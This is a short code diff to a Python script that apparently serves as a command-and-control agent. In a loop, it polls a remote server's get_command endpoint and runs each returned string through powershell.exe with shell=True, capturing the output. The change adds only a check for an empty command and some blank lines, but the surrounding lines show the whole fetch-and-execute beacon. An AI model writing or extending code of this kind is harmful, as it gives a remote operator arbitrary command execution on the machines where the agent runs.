@@ -48,6 +48,8 @@ def get_command(agent_id):
     }
     # receive command from queue
     data = requests.post(f"{base_url}/api/1.1/get_command", json=json).text
+    if data == 'None':
+        return
     cmd = subprocess.Popen(["powershell.exe", data], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
     output_bytes = cmd.stdout.read() + cmd.stderr.read()
@@ -65,3 +67,8 @@ if __name__ == "__main__":
     id_agent = 1
     while True:
         get_command(id_agent)
+
+
+
+
+
